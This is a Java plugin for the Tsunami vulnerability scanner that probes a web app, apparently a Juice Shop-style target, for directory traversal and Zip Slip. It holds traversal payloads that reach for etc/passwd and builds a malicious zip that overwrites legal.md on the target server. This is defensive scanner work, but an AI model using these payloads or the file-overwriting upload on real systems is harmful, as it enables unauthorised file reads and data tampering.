/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import com.google.common.io.Files;
import java.io.File;
import org.apache.commons.io.FilenameUtils;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import java.util.zip.ZipEntry;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "DirectorytraversaldetectorDetector",
    version = "0.1",
    description = "Detects DirectoryTraversalDetector vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = DirectorytraversaldetectorDetectorBootstrapModule.class)
public final class DirectorytraversaldetectorDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public DirectorytraversaldetectorDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Directorytraversaldetector Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;

    try {
        // Test 1: Direct directory traversal attempt
        HttpResponse directoryResponse = httpClient.send(
            HttpRequest.get(targetUri + "/ftp")
                .build(),
            networkService);

        if (directoryResponse.status().code() == 200) {
            String directoryContent = directoryResponse.bodyBytes()
                .map(ByteString::toStringUtf8)
                .orElse("");
            if (directoryContent.contains("acquisitions.md")) {
                successfulAttacks++;
            }
        }

        // Test 2: Try to access sensitive file via traversal
        HttpResponse fileResponse = httpClient.send(
            HttpRequest.get(targetUri + "/ftp/acquisitions.md")
                .build(),
            networkService);

        if (fileResponse.status().code() == 200) {
            successfulAttacks++;
        }

        // Test 3: Path traversal variations
        String[] traversalPayloads = {
            "../",
            "../../",
            "../../../",
            "..\\",
            "..\\..\\",
            "..\\..\\..\\"  
        };

        for (String payload : traversalPayloads) {
            String encodedPayload = URLEncoder.encode(payload, StandardCharsets.UTF_8);
            HttpResponse traversalResponse = httpClient.send(
                HttpRequest.get(targetUri + "/ftp/" + encodedPayload + "etc/passwd")
                    .build(),
                networkService);

            if (traversalResponse.status().code() == 200) {
                String responseBody = traversalResponse.bodyBytes()
                    .map(ByteString::toStringUtf8)
                    .orElse("");
                if (responseBody.contains("root:") || responseBody.contains("/bin/bash")) {
                    successfulAttacks++;
                    break;
                }
            }
        }

        // Test 4: Zip Slip attack simulation
        byte[] zipContent = createMaliciousZipContent();
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Content-Type", "multipart/form-data")
            .build();

        HttpResponse zipResponse = httpClient.send(
            HttpRequest.post(targetUri + "/file-upload")
                .setHeaders(headers)
                .setRequestBody(ByteString.copyFrom(zipContent))
                .build(),
            networkService);

        if (zipResponse.status().code() == 200) {
            // Verify if the file was overwritten by trying to access it
            HttpResponse verifyResponse = httpClient.send(
                HttpRequest.get(targetUri + "/ftp/legal.md")
                    .build(),
                networkService);

            String modifiedContent = verifyResponse.bodyBytes()
                .map(ByteString::toStringUtf8)
                .orElse("");
            
            if (modifiedContent.contains("MODIFIED")) {
                successfulAttacks++;
            }
        }

        return successfulAttacks > 0;

    } catch (IOException e) {
        logger.atWarning().log(
            "Directory traversal test failed on '%s': %s", networkService, e.getMessage());
        return false;
    }
}

private byte[] createMaliciousZipContent() throws IOException {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    try (ZipOutputStream zos = new ZipOutputStream(baos)) {
        ZipEntry entry = new ZipEntry("../../ftp/legal.md");
        zos.putNextEntry(entry);
        byte[] fileContent = "MODIFIED content".getBytes(StandardCharsets.UTF_8);
        zos.write(fileContent);
        zos.closeEntry();
    }
    return baos.toByteArray();
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("DIRECTORYTRAVERSALDETECTOR_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("DirectoryTraversalDetector Vulnerability Exposed")
                .setDescription("The application is vulnerable to DirectoryTraversalDetector attacks.")
                .setRecommendation(
                    "1. Implement proper input validation and sanitization for file paths\n2. Use safe file APIs that prevent directory traversal\n3. Restrict file access to intended directories only\n4. Validate and sanitize file names during archive extraction\n5. Implement proper access controls on file resources"))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("DIRECTORYTRAVERSALDETECTOR_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("DirectoryTraversalDetector Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to DirectoryTraversalDetector attacks.")
            .setRecommendation(
                "1. Implement proper input validation and sanitization for file paths\n2. Use safe file APIs that prevent directory traversal\n3. Restrict file access to intended directories only\n4. Validate and sanitize file names during archive extraction\n5. Implement proper access controls on file resources")
        .build());
  }
}